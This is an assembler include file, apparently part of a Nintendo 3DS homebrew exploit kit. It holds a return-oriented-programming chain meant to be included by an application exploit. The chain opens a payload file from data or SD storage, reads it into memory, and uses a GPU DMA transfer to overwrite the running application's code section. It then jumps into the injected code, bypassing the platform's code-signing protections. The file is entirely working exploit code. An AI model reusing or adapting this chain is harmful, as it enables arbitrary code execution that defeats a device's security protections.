#pragma once

@ This is intended to be included by a regular-application exploit .s.

#ifndef ROPKIT_TMPDATA
	#define ROPKIT_TMPDATA 0x0FFF0000
#endif

#define ropkit_IFile_ctx (ROPKIT_TMPDATA+4)

#ifndef ROPKIT_BINLOAD_ADDR
	#define ROPKIT_BINLOAD_ADDR ROPKIT_LINEARMEM_BUF
#endif

#ifndef ROPKIT_BINLOAD_SIZE
	#define ROPKIT_BINLOAD_SIZE 0xC000
#endif

#ifndef ROPKIT_BINPAYLOAD_PATH
	#define ROPKIT_BINPAYLOAD_PATH "data:/payload.bin"
#endif

#ifndef ROPKIT_OTHERAPP_NEWSP_ADDR
	#define ROPKIT_OTHERAPP_NEWSP_ADDR (0x10000000-4)
#endif

#ifdef ROPKIT_MOUNTSD
CALLFUNC_NOSP FS_MountSdmc, (ROPBUF + (ropkit_sd_archivename - _start)), 0, 0, 0
#endif

@ Load the file into the buffer.

CALLFUNC_NOSP IFile_Open, ropkit_IFile_ctx, (ROPBUF + (ropkit_sdfile_path - _start)), 1, 0

CALLFUNC_NOSP IFile_Read, ropkit_IFile_ctx, ROPKIT_TMPDATA, ROPKIT_BINLOAD_ADDR, ROPKIT_BINLOAD_SIZE
COND_THROWFATALERR

ROPMACRO_IFile_Close ropkit_IFile_ctx

@ Write the codebin into .text.
@ TODO: Determine the dst addr in ROP for old3ds/new3ds support.

CALL_GXCMD4 ROPKIT_LINEARMEM_BUF, (0x14000000 + ROPKIT_APPMEM_TEXT_OFFSET + 0x1000), ROPKIT_BINLOAD_SIZE

@ Wait 0.1s for the transfer to finish.
CALLFUNC_R0R1 svcSleepThread, 100000000, 0

@ Setup the paramblk.

CALLFUNC_NOSP MEMSET32_OTHER, ROPKIT_LINEARMEM_BUF, 0x1000, 0, 0

ROPMACRO_WRITEWORD (ROPKIT_LINEARMEM_BUF + 0x1c), GXLOW_CMD4
ROPMACRO_WRITEWORD (ROPKIT_LINEARMEM_BUF + 0x20), GSPGPU_FlushDataCache
ROPMACRO_WRITEWORD (ROPKIT_LINEARMEM_BUF + 0x48), 0x8d @ Flags
ROPMACRO_WRITEWORD (ROPKIT_LINEARMEM_BUF + 0x58), GSPGPU_SERVHANDLEADR

@ Jump to the payload.
CALLFUNC_R0R1 0x00101000, ROPKIT_LINEARMEM_BUF, ROPKIT_OTHERAPP_NEWSP_ADDR

.word 0x40506070

#ifdef ROPKIT_MOUNTSD
ropkit_sd_archivename:
.string "sd:"
.align 2
#endif

ropkit_sdfile_path:
.string16 ROPKIT_BINPAYLOAD_PATH
.align 2

